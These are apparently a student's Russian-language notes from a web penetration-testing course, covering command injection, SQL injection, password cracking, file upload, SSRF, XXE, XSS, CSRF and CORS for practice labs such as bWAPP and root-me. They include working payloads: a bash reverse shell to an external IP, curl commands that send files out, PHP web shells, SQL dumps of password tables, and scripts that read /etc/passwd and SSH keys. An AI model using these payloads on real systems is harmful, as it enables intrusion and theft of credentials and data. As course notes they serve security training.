@@ -1,0 +1,1045 @@
+Занятие 1
+
+Для полноценного написания отчета необходимо обладать познаниями в сфере безопасной разработки, и т п
+
+Подходы к анализу:
+Черный ящик - хз как оно внутри работает
+Серый ящик  - есть доступ с правами обычного юзера и немного исходного кода
+Белый ящик  - есть исходники, юхууу... Но придется весь этот код просмтреть =(
+
+Где искать уязвимости
+Owasp Testing Guide - актуальная информация по тестированию (гайды) 
+OWASP CheatSheet    - еще одна шпаргалка
+
+PortSwinger Web Security Academy - много серьезных задач, в интересном формате
+ctftime.org и другие ctf
+root-me.org
+w3challs.com
+
+Авто сканеры
+bWAPP
+Damn Vulnerable Web Application
+
+Важно делать заметки!
+Cherry tree 
+Trilium	интересная альтернатва cherry tree 
+
+https://github.com/tennc/webshell		веб шеллы на все случаи жизни
+
+
+
+Http request
+
+GET     /profile.jsp	    ?user=admin&pass=12345  HTTP/1.1
+^метод  ^путь к исходнику  ^параметры              ^версия протокола
+
+Headers:
+Host: www.google.com
+User-Agent: Mozila/5.0
+...
+/b/n
+
+
+Http response
+
+HTTP/1.1  200 	   OK
+^version  ^status  ^status message
+
+
+Коды:
+1xx - информационный (102 Processing)
+2xx - успех (200 OK)
+3xx - перенаправление (301 Moved Permanently)
+4xx - ошибка клиента (400 Bad Request)
+5xx - ошибка сервера (500 Internal Server Error)
+
+
+
+Пример
+Получаем инфомрацию о сервисе
+$ nc -v example.com
+GET / HTTP/1.1
+Host: example.com
+
+
+https://gchq.github.io/CyberChef/
+CyberChef онлайн энкодер/декодер
+мощный инструмент для многоэтапного кодирования
+
+HW
+root-me.org/Challenges/Web-Server
+HTML - source
+User agent
+Headers
+Improper redirect
+Verb tampering
+
+
+
+
+
+Занятие 2
+
+route - отвечает за реакцию на действя пользователей (логин, переходы и т. п.)
+
+Flusk, Spring		работают на бэкенде (сервер)
+
+
+Сбор информации
+имена файлов
+имена элементов HTML
+имена Cookie
+
+Плагин для браузера (автоматческй анализ)
+Wapalyzer
+
+Типы поиска
+пассивный:  В гугле site:<url> type:<pdf> ...
+краулинг:   Бот переходт по всем ссылкам на странце
+дирбастинг: Брутфорс по дирикториям/файлам
+
+Burp -> dashoard -> Capturing 
+
+
+
+Crawler:
+Каждый пентестер пишет под себя (что-то вроде челенджа)
+Видит ссылку, переходит по ней, на ней тоже ищет ссылки
+https://github.com/govolly/colly
+https://github.com/Nekmo/dirhunt
+
+
+Dirhunt
+$ pip3 install dirhunt
+
+Перенаправление результатов сканирования dirhunt в burp
+$ pip3 install dirhunt
+$ dirhunt -p 127.0.0.1:8080 http://evil.com
+Данные передаются в burp (Targets)
+
+
+
+Dirbuster:
+https://github.com/ffuf/ffuf
+https://github.com/maurosoria/dirsearch
+
+
+Dirsearch
+$ git clone https://github.com/maurosoria/dirsearch.git
+$ cd dirsearch
+$ pip3 install -r requirements.txt
+$ python3 dirsearch.py -u <URL> -e <EXTENSIONS>
+
+$ python3 dirsearch.py -u <URL> -w <list> --max-rate=20
+
+
+FFUF
+Качаем релиз с https://github.com/ffuf/ffuf
+$ ./ffuf -w list.txt -u https://scan-87.online/FUZZ -p 1 -t 10 -mc all -c -v
+-p	задержка между запросами
+-t 	количество потоков
+-mc 	код ответа (200 - успех)
+
+
+Cловари
+https://github.com/Bo0oM/fuzz.txt		Словарь для 
+https://wordlists.assetnote.io			Автоматически обновляемый словарь
+https://github.com/danielmiessler/SecLists	Словари на все случаи жизни
+https://github.com/empty-jack/YAWR		Йарр (recon/internal_services <3)
+
+
+
+Перебор значений через Burp
+1. Intruder -> Positions -> Sniper -> <вставляем §§ на место подстановки>
+2. Intruder -> Payloads -> <выбираем словари>
+
+
+Дамп .git дирикторий
+https://github.com/kost/dvcs-ripper
+https://github.com/internetwache/GitTools
+$ git log			просмотреть историю коммитов
+$ git checkout <commit hash>	переходим к конкретной версии 
+
+
+GitTools
+https://github.com/internetwache/GitTools
+Дамп репозитория 
+$ bash Gitools/Dumper/gitdumper.sh  http://website.com/.git/ <dump>
+Обработка репозрория в удобный вид
+$ bash ~/utils/GitTools/Extractor/extractor.sh <dump> <recovered>
+
+
+
+
+
+Занятие 3
+
+OS Command Injection
+
+Поднимаем стенд
+https://hub.docker.com/r/raesene/bwapp
+# docker run -d -p 0.0.0.0:8080:80 raesene/bwapp
+В бразуере <ip>:8080/install.php
+
+<?php
+$command = 'mkdir' + '_REQUEST['dirname']';
+system($command);
+?>
+
+
+
+Примеры
+
+http://vuln.com?dirname=dir;ls
+
+target=www.nsa.gov;ls&form=submit
+
+
+
+Reverse Shell
+
+* Если сервис выводит результаты выполнения консольной команды:
+target=www.nsa.gov;bash -c 'exec bash -i >& /dev/tcp/192.168.1.36/4242 <&1'&form=submit
+Выделить шелл -> ПКМ -> Convert Selection -> URL -> Url Encode
+
+
+* Если сервис не выводт консольный вывод (Blind)
+
+Python
+На хендлере:
+$ python3 -m http.server 9090	Поднмаем сервер
+На уязвмом сервсе:
+127.0.0.1;wget http://192.168.1.36:9090/file.txt
+Такм образом, если сервис постучтся к нам на сервак, мы поймем, что инъекция удалась
+
+Ping
+Выполнение команды займет 10 секунд, соответственно ответ придет с большой задержкой
+|| ping -c 10 127.0.0.1 ||	
+
+netcat
+Обнаружение работоспособности 
+Хендлер:
+$ nc -nvlp 11337
+Cервис:
+<>%0a nc 195.2.***.51 11337
+
+Передача файла
+Хендлер:
+$ nc -nvlp 11337
+Сервис:
+<>%0a curl -X POST -F file=@file.txt http://195.2.***.51:11337
+
+
+
+Всевозможные шеллы
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+
+
+Отделение одной команды от другой
+;			
+|			
+%0a			новая строка
+&& или ||		в зависимости от логики
+cat$IFS/etc/passwd	только линукс (пробел)
+
+
+
+Выполнение подкоманды (только линукс)
+`ls`
+$(ls)
+
+
+
+Защита:
+
+1. Валидация входных данных
+Соответствие типу данных
+Корректность формата
+Регулярные выражения
+Разрешенный набор символов
+
+2. Безопасный вызов команд
+
+
+ДЗ
+https://ringzer0ctf.com/challenges/240
+
+
+
+
+
+Занятие 4
+
+CWE top 25		Топ уязвмостей в прложенях (редко появляется что-то новое)
+
+
+
+Обучалки
+https://www.jdoodle.com/execute-sql-online	SQLite
+http://sqlfiddle.com/				MySQL Конвертер запросов из одной версии sql в другую
+http://rextester.com/l/sql_server		MSSQL, PostgreSQL, MySQL
+https://sqliteonline.com/			MSSQL, PostgreSQL, SQLite, MariaDB С дополнтельным матералом
+
+https://sql-ex.ru				Тренажер
+
+SQLite 	База хрантся в одном файле. Часто встречается в мобльных прложениях
+
+
+
+SQL инъекция
+
+URL based injection  (GET) 		В адресной строке
+Form based injection (POST)		В форме
+
+SELECT user FROM users WHERE login='$username' AND password='$password'
+username=1234&password=asdf
+
+Error based SQL инъекция
+Подстановка ' на любую позцю позволит вызвать синтаксческую ошибку и иногда получить ее статус (или определить по задержке запроса)
+
+
+!!!!!
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+!!!!!
+
+
+SQL bypass
+
+Комментарий
+SELECT user FROM users WHERE login='admin' or 1=1 # AND password='123'
+$username= admin' or 1=1; #'
+$password= 123
+
+Дополнение
+$username= admin' or 'a'='a
+
+
+'ds$%^&*()		скорее всего выведет ошбку (иногда полный SQL запрос)
+
+admin')--
+admin') or ('True
+
+
+
+UNION based SQL инъекция
+admin' or 1 union select 1,2 #
+admin' or 1 union select version(),2 #			Вытащить сведения о бд
+admin' or 1 union select table_name,2 from information_schema.tables#
+admin' or 1 union select column_name,2 from information_schema.columns+wHeRe+table_name="users"#	Вытащить данные
+admin' or 1 union select password,2 from users#
+достать дальше 
+
+
+
+На exploit db есть отлчные мануалки
+https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
+
+
+
+
+
+Занятие 5
+
+webhook.site		Сайт для приема запросов от приложеня
+
+curl -d '@/etc/passwd'
+
+admin'union select username,password from users--
+
+id=-1 union select 1,2,3 --
+
+admin' or 1=1 -- 123
+
+
+
+UNION based injection
+1. id=-1 union select 1,2,3	Перебреаем значеня пока не исчезнет ошибка
+2. id=-1 union select username,password,3 from users	Вытаскиваем данные
+
+
+
+$ python
+>>> "'/etc/passwd'".encode('hex')
+id=-1 UNION ALL SELECT 1,2,3,LOAD_FILE(0x272f6574632f70617373776427) --
+
+
+
+SQLmap
+https://github.com/sqlmapproject/sqlmap
+
+--risk  <1-3>	Тяжесть и опасность запросов (лучше оставть 1)
+--level <1-5>	Колчество проверяемых векторов (увелчивает длительность)
+-v <1-6>	Verbose
+
+--technique <B/E/U/S/T/Q>
+B 	Boolean-based blind
+E	Error-based
+U	Union query-based
+S	Stacked queries
+T	Time-based
+Q	Inline queries
+
+--tamper="<between>"	Модфикация запросов. Схемы изменения из директории tamper/
+--batch		Автоматчески используем запросы
+-p username		Название параметра для подстановки
+--random-agent		
+--drop-set-cookie	Дропать куки, по которым могут отслеживать наши действия
+--cookie		Установить cookie самостоятельно
+--dump			После поска эксплойта, можно сдампить базу
+--dump-all
+
+Использование
+1. Через Burp поймать запрос с параметрами для отправки 
+2. Скопировать запрос в файл request (без лишних '\n')
+3. $ python3 sqlmap.py -r request -p <username>
+4. После успешного поиска эксплойта, можно сдампить базу 
+$ python3 sqlmap.py -r request -p <username> --dump
+
+Пример эффектиивной команды
+$ python3 sqlmap.py -r request --risk=3 --level=5 --delay 5 --batch -v 4
+
+
+
+Что бы не банили:
+timeout > 8 sec
+random user agent
+
+
+
+
+
+Занятие 6
+
+Authentication BruteForce
+
+Идентификация - процесс определения, что за человек перед нами
+Аутентификаця - процесс подтверждения, что этот человек менно тот, за кого себя выдает
+Авторизаця - процесс принятя решения о том, что менно этой аутентфцированной персоне разрешается делать 
+
+
+Факторы аутентфикации
+Знание		(пароль)
+Обладане	(смарт карта)
+Биометрния	
+
+
+Cессии
+https://jwt.io		
+
+JWT часто встречается в мобльной разработке
+JWT состоит из 'header'.'payload'.'signature'
+
+header:
+какой тип идентфкатора и как его использовать
+base64
+
+payload:
+данные о пользователе
+base64
+
+signature:
+контрольная сумма от header + payload зашифрованная ключом, хранящимся на сервере
+sha256
+
+
+
+Пароли
+часто встречаются однаковые пароли
+Password spraying - крайне эффективный метод
+Пользователи часто используют одинаковые пароли
+
+Единственный рабочий вариант - капча
+
+
+
+Брут капчи
+
+$ pip3 install pytesseract
+
+import pytesseract
+from PIL import Image
+print(pytesseract.image_to_string(Image.open('captcha.jpeg')))
+
+
+
+Ищем почты
+https://hunter.io
+https://maildb.io
+https://github.com/Laramies/theHarvester
+google: "@hackeru.com"
+
+Хорошие английские креды
+https://github.com/danielmiessler/SecLists/tree/master/Usernames
+
+https://weakpass.com			Спсок паролей с рейтнгами
+https://guthub.com/sharsi1/russkiwist	Ру пароли
+
+
+
+
+
+Занятие 7 
+
+Offline Brute force
+
+https://github.com/hashcat/hashcat		Репозторий hashcat
+https://github.com/sharsi1/russkiwlst		Русскй словарь
+https://github.com/praetorian-inc/Hob0Rules/	rockyou.txt
+
+
+Определить тип хеша
+https://www.tunnelsup.com/hash-analyzer/		Узнать тип хеша
+https://hashcat.net/wiki/doku.php?id=example_hashes	Параметр hashcat
+
+
+Атака по словарю
+$ hashcat -a 0 -m <hash_id> <hash> <wordlist>
+$ hashcat -a 0 -m <hash_id> <hash_file> <wordlist>
+$ hashcat -a 0 -m <hash_id> <hash_file> <wordlist> --show	Показать что уже взломано
+hashcat -a 0 -m <hash_id> 'hash' <wordlist>			Если возникает ошибка Separator unmatched
+
+
+Атака по правилам мутаци словаря
+https://hashcat.net/wiki/doku.php?id=rule_based_attack
+https://github.com/hashcat/hashcat/blob/master/rules/InsidePro-PasswordsPro.rule	Список с отличными правилам мутации словаря
+$ hashcat -a 0 -m <hash_id> -r <rules_file> <hash> <wordlist>
+
+
+Атака по маске 
+$ hashcat -a 3 -m <hash_id> <hash> <?!?!?!>
+?l		lowercase letters
+?u		uppercase letters
+?d		digits
+?s		special chars
+?a=?!?u?d?s	объединение
+
+Можно задать свою маску
+-1 "?!?u?d"
+
+$ hashcat -a 3 -m <hash_id> <hash> -1 ?l?u?d?s -i ?1?1?1?1?1?1?1
+
+
+-i --increment-min=4	Начнаем брутить с 4-х символьных паролей
+
+
+Online рессурсы для поска уже забрученных паролей
+hashkiller.io
+crackstation.net
+google.com!
+
+
+
+
+
+File Upload
+работает в PHP и NodeJS
+
+Web шеллы
+https://github.com/tennc/webshell
+https://github.com/BlackArch/webshell
+
+Самый популярный шелл - WSO
+https://github.com/tennc/webshell/blob/master/web-malware-collection-13-06-2012/PHP/wso2.5.php
+
+
+Опять же, в шелле могут быть закладки
+Перед спользованием
+1. просмотреть код
+2. развернуть на тестовой среде
+3. в течение пары часов смотреть трафк с тестовой среды c помощью wireshark
+4. скопровать безопасную версию  дальше спользовать только ее
+5. перед загрузкой сменть пароль и переименовать файл, что бы никто не нашел!
+
+
+
+Простейший веб-шелл. запсываем в <test.php> на сайте
+<?php passthru($_GET[0]); ?>
+
+Для выполнения команд - идем по адресу
+https://site.com/test.php?0=ls
+
+
+
+Веб шелл на PHP с выводом ошибок возможностью загрузки файлов
+<?php
+$x="pipe";
+$z=array($x, "w");
+$proc=proc_open($_REQUEST["c"],array(array($x,"r"),$z,$z)$ps);
+echo "Output: \n".stream_get_contents($ps[1])."Errors: \n".stream_get_contents($ps[2]);
+echo "\nWrited bytes:
+".file_put_contents($_REQUEST["fname"],ase64_decode($_REQUEST["data]));
+?>
+
+
+$ file		Смотрт только на первые 4 байта (magick). Если их поменять, можно изменить тип файла
+
+
+
+
+
+Занятие 8
+
+File Upload живет в кастомных либо старых приложениях
+Так же можно найти в tomcat
+
+
+
+Doule extension
+
+1. через Burp ловим запрос с отправкой картинки, отправляем в репитер
+
+2. В filename добавляем второе расшрение
+file.png.php
+file.php.png
+
+3. Заменяем картинку на наш шелл
+-----------------------------397342361038278619143294585699--
+Content-Disposition: form-data; name="file"; filename="cpu.png.php"
+Content-Type: image/png
+
+<?php passthru($_GET[0]); ?>
+-----------------------------397342361038278619143294585699--
+
+4. В браузере открываем файл с командой http://../file.jpeg?0=ls
+
+
+
+Null Byte
+
+1. Через Burp ловим запрос с отправкой картинки, отправляем в репитер
+
+2. В filename ставим cpu.php%00.jpeg
+
+3. Заменяем картинку на наш шелл
+-----------------------------397342361038278619143294585699--
+Content-Disposition: form-data; name="file"; filename="cpu.php%00.jpeg"
+Content-Type: image/png
+
+<?php passthru($_GET[0]); ?>
+-----------------------------397342361038278619143294585699--
+
+
+
+Path Traversal
+
+?page=../../../../../../etc/passwd
+
+
+include
+
+Что читать?
+исходники index.php
+конфги
+логи
+/etc/passwd
+/etc/shadow
+/etc/issue
+/etc/hosts
+/etc/hostname
+
+Хорошй список
+https://nets.ec/File_Inclusion
+
+file://	локальные файлы
+
+
+
+Archive Upload
+
+домашки из bwapp
+file upload
+local file inclusion
+
+root me 
+zip upload
+
+
+
+
+
+Занятие 9
+
+Broken Access Control
+
+Если пользователь может войти в чужой личный кабинет, то это очень нехорошо
+
+Разграничение доступа:
+- на функциональном уровне (у пользователей свои роли со доступом)
+- на уровне объектов ()
+
+
+
+Sequencer
+Создав 100 заказов в магазне, получаем 100 сгенеррованных идентификаторов
+Загружаем в sequencer идентфикаторы и начинаем анализ
+Бурп определит, насколько хорошо работает рандомайзер
+Если рандомайзер такой себе, то закономерность можно попробовать угадать/забрутить
+
+
+
+Intruder
+Можно генерровать набор пейлоадов и подставлять его на нужное место
+
+
+
+Идентфикаторы могут быть 
+1. Предсказуемые (чсла, смысловые строки, email)
+2. Не предсказуемые (рандомно сгенерированные строки)
+
+
+
+плагин Firefox Multi-Account Containers
+Firefox Multi-Account Containers
+можно заходть с разных аккаунтов в одно приложение
+
+
+
+Плагины для бурпа
+Extender -> BApp
+
+AuthMatrix
+На вход подаем заранее обнаруженные директории приложения
+Ходит с разным учетками по прложению и отмечает куда у пользователя есть доступ
+
+
+
+Наиболее релевантные api
+https://github.com/chrislockard/api_wordlist
+https://github.com/empty-jack/YAWR/blob/master/Web/actions.txt
+
+
+
+
+
+Занятие 10
+
+SSTI
+
+Server Side Template Injection
+Современные сайты не самописные, при написании frontend спользуют спецальные фреймворки
+Иногда если завернуть выполнение команды на языке фреймворка, можно выполнить command injection
+
+Алгоритм
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png
+
+
+
+Logical bugs
+
+https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
+
+На php при сравнении безопаснее использовать === вместо ==
+
+
+
+Race condition
+
+Если на баллансе средств хватает только на покупку одного предмета, то можно несколько раз с минимальным интервалом отправть несколько запросов и получить несколько экземпляров предмета
+
+TurboIntruder
+
+Накрутка бонусов старбакс
+habr.com/ru/post/258449
+
+Одновременная отправка двух запросов
+Burp -> copy as curl command
+Далее в терминале:
+$ curl <...> & curl <...> &
+
+
+
+steghide - утилта по стеганографии
+
+
+
+ДЗ
+
+portswigger server-side-template-injection
+PHP - type juggling
+Java - Server-Side Template Injection
+
+
+
+
+
+Занятие 11
+
+Пример сериалзации
+
+<?php
+$test=0;
+$simple = "test";
+$bool = false;
+echo serialize($test) . "\n";
+echo serialize($simple) . "\n";
+echo serialize($bool) . "\n";
+?>
+
+i:0;
+s:4:"test";
+b:0;
+
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
+
+https://github.com/ambionics/phpggc
+
+погуглть blackhat phpggc
+
+
+
+Стенд и плюшки с zeronights
+https://github.com/GrrrDog/ZeroNights-WebVillage-2017
+
+
+portswigger deserialisation
+
+
+
+Десериализация атака на языке java
+https://githu.com/frohoff/ysoserial
+
+
+
+
+
+Занятие 12
+
+SSRF
+Server Side Request Forgery
+
+Позволяет:
+Выполнять запросы на недоступные из внешней сети ресурсы
+Сканровать внутреннюю сеть
+Обходить проверки и ограничения
+
+Можно пропустить localhost:<port> через intruder и отфильтровать открытые порты (другой вид ошибки)
+
+https://github.com/tarunkant/Gopherus
+
+Инструменты автоматизации
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery
+
+Доп материалы
+SSRF Bible (2020)
+A New Era of SSRF
+
+
+
+XML 
+eXternal Entity (XXE)
+<?xml version="1.0"?><!DOCTYPE root [<! ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+
+<?xml version="1.0"?><!DOCTYPE thegame[<!ELEMENT thegame ANY><!ENTITY xxe SYSTEM "/etc/passwd">]><thegame>&xxe;</thegame>
+
+
+
+В PDF зараженные файлы содержат action script который можно распарсть
+
+https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570
+
+
+
+Последние 20 минут очень интересная атака 
+
+iframe pdf 
+
+Загружаем на наш сервер file.php 
+<?php
+header('location:file:///home/user/.ssh/id_rsa');
+?>
+
+
+
+ДЗ
+portswigger ssrf 
+basic ssrf against localhost
+https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery
+
+portswigger xxe/lab-exploiting-xxe
+
+rootme
+xml external entity
+server side request forgery
+
+
+
+
+
+Занятие 13
+
+XSS
+
+1. подстановка <script></script>
+<script>alert(0)</script>
+часто бывает замена на безопасные элементы
+
+2. Выход из контекста тега, добавлениием кавычки
+<embed src=" ... "" />
+
+3. Поскать в респонде теги crs, в которые можно что-то вставить
+
+
+
+Генерируем пейлоад через python
+>>> url="https://scan-87.online"
+>>> res=[]
+>>> for i in url:
+...     res.append(ord(i))
+... 
+>>> res
+[104, 116, 116, 112, 115, 58, 47, 115, 99, 97, 110, 45, 56, 55, 55, 46, 111, 110, 108, 105, 110, 101]
+
+Вставляем пейлоад в запрос
+<script>window.location = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 115, 99, 97, 110, 45, 56, 55, 55, 46, 111, 110, 108, 105, 110, 101)</script>
+
+
+
+https://learn.javascript.ru/xmlhttprequest
+https://learn.javascript.ru/fetch
+
+
+
+CSRF
+
+Перенаправление
+заполнение  спбмт формы
+xmlHTTPREquest, fetch
+ссылка на ресурс (<img src=...)
+
+Заголовок запроса из Burp
+POST /web-client/ch22/index.php?action=profile
+
+Оригинальная форма
+<form action="?action=profile" method="post" enctype="multipart/form-data">
+		<div class="form-group">
+		<label>Username:</label>
+		<input type="text" name="username" value="scan">
+		</div>
+		<br>		
+		<div class="form-group">
+		<label>Status:</label>
+		<input type="checkbox" name="status" disabled="">
+		</div>
+		<br>	
+		<button type="submit">Submit</button>
+		</form>
+
+Переписанная форма
+	<form id="attack-form" target="attack" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype=multipart/form-data">
+	<input type="text" name="username" value="scan" >
+	<input type="checkbox" name="status" checked >
+	<input type="submit" value="Submit">
+	</form>
+	<script>document.getElementById("attack-form").submit()</script>
+	
+Отправляем форму жертве
+
+
+Burp PRO умеет самостоятельно генерировать формы CSRF
+
+
+
+SameSite Cookie
+
+
+
+
+
+Занятие 14
+
+CORS
+
+<script>
+var request = new XMLHttpRequest();
+request.onload = requestListen;
+request.open('GET', 'https://ac0f1f2a1f8f145980ae23b200f600a9.web-security-academy.net/accountDetails', true);
+request.withCredentials = true;
+request.send();
+
+
+function requestListen(){
+location='/test?test='+this.responseText;
+};
+</script>
+
+Украсть куки
+
+
+
+BeEF
+Старый фреймворк для захвата браузера
+
+
+
+Типы XSS
+1. Хранимая 	(срабатывает каждый раз, так как данные лежат в бд)
+2. Отраженная 	(срабатывает только один раз)
+
+
+
+Polyglot XSS	Варианты для обхода фильтрации 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
+
+
+
+
+
+Занятие 15
+
+Content Security Policy
+
+https://content-security-policy.com			Список политик и матерала по CSP
+https://content-security-policy.com/browser-test	Проверка браузера на применение CSP
+
+
+
+
+
+Занятие 16
+
+Консалтинговые компании
+Информзащита, Бизон, СоларСекьюрит, ДСек
+Много времени на составление отчетов, мало на сам пентест
+
+Продуктовые компании
+Касперский, Валарм, Positive Tech
+Более класический пентест
+
+Self Employed
+С нуля очень трудно искать контракты
+Обычно их берут по знакомству, со старого места работы
+Ответственность за ущерб
+Важно иметь хорошее имя 
+
+
+
+jun - 60-120
+mid - 150-200
+sen - 180-250
+
+за год-полтора можно дойти до 150
+Очень важно сделать себе имя в коммъюнити
+
+
+
+pentest.deteact.ru
+омар ганиев 
+"хочу в иб"
+
+Подробный роадмап
+
+https://docs.google.com/spreadsheets/d/15w9mA5HB9uuiquIx8pavdxThwfMrH7HSv2zmagrekec/edit#gid=141308356
+
+https://www.googleadservices.com/pagead/aclk?sa=L&ai=DChcSEwiMkenOtKTyAhXWibIKHSpFBIMYABAAGgJscg&ae=2&ohost=www.google.com&cid=CAESQeD2g2_6UosL4i9lxvO4ZfoRdafogwoEHgYguWP-u7g_UN92r8ByGueIz8OXkrSkC6y3bTTHYL7jmm5uiRKUO08L&sig=AOD64_3MDJdiHSoxJ0_g9odkeNnN3fbpcg&q&adurl&ved=2ahUKEwiW1OHOtKTyAhUbi8MKHad2Dw0Q0Qx6BAgCEAE&dct=1 
+https://music.yandex.ru/album/8849520/track/58374562  
+
+
+
+Площадка для изучения крипты (похож на portswigger)
+https://cryptohack.org
+
+
+
